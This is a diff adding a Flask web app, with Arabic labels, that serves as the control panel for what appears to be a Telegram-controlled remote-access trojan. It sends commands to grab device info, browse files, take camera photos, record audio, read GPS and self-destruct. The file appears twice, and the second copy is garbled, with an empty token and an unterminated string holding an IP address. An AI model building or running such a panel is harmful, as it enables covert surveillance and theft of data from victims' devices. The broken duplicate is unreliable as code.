@@ -1,0 +1,71 @@
+from flask import Flask, render_template, request, redirect, url_for
+import requests
+
+app = Flask(__name__)
+
+# Telegram Bot Info
+TOKEN = "ضع_توكن_البوت_هنا"
+CHAT_ID = "ضع_ID_بتاعك_هنا"
+API_URL = f"https://api.telegram.org/bot{TOKEN}"
+
+# قائمة بالأوامر المتاحة
+COMMANDS = {
+    "📡 معلومات الجهاز": "/info",
+    "📁 تصفح الملفات": "/files",
+    "📸 صورة الكاميرا": "/photo",
+    "🎤 تسجيل صوت": "/record",
+    "📌 GPS": "/gps",
+    "💣 حذف البوت": "/selfdestruct"
+}
+
+def send_command(command):
+    requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": command})
+
+@app.route("/")
+def index():
+    return render_template("index.html", commands=COMMANDS)
+
+@app.route("/send", methods=["POST"])
+def send():
+    cmd = request.form.get("command")
+    if cmd:
+        send_command(COMMANDS[cmd])
+    return redirect(url_for("index"))
+
+if __name__ == "__main__":
+    app.run(debug=True, port=5000)from flask import Flask, render_template, request, redirect, url_for
+import requests
+
+app = Flask(__name__)
+
+# Telegram Bot Info
+TOKEN = 
+CHAT_ID = "72.14.201.52
+API_URL = f"https://api.telegram.org/bot{TOKEN}"
+
+# قائمة بالأوامر المتاحة
+COMMANDS = {
+    "📡 معلومات الجهاز": "/info",
+    "📁 تصفح الملفات": "/files",
+    "📸 صورة الكاميرا": "/photo",
+    "🎤 تسجيل صوت": "/record",
+    "📌 GPS": "/gps",
+    "💣 حذف البوت": "/selfdestruct"
+}
+
+def send_command(command):
+    requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": command})
+
+@app.route("/")
+def index():
+    return render_template("index.html", commands=COMMANDS)
+
+@app.route("/send", methods=["POST"])
+def send():
+    cmd = request.form.get("command")
+    if cmd:
+        send_command(COMMANDS[cmd])
+    return redirect(url_for("index"))
+
+if __name__ == "__main__":
+    app.run(debug=True, port=5000)
